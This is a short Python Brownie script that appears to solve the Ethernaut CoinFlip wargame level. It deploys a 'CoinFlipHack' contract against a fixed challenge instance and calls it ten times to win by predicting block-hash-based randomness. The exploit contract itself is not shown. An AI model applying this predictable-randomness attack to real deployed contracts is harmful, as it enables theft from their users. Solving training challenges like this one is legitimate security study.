from brownie import CoinFlip, CoinFlipHack
from brownie import chain
from scripts.challenge_utils import (
    connect_to_challenge, get_acc
)
from web3 import Web3
from time import sleep

ETHERNAUT_INSTANCE = '0x664d2f559AC4eE33b0eF6c617023f73E53Caa642'
FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968

def main():
    connect_to_challenge()
    contract = CoinFlip.at(ETHERNAUT_INSTANCE)
    acc = get_acc()
    print(f'using {acc}')

    hack = CoinFlipHack.deploy(
        ETHERNAUT_INSTANCE, FACTOR, {'from': acc}
    )

    for i in range(10):
        hack.play({'from': acc}).wait(2)
        print(f'Consecutive wins: {contract.consecutiveWins()}')

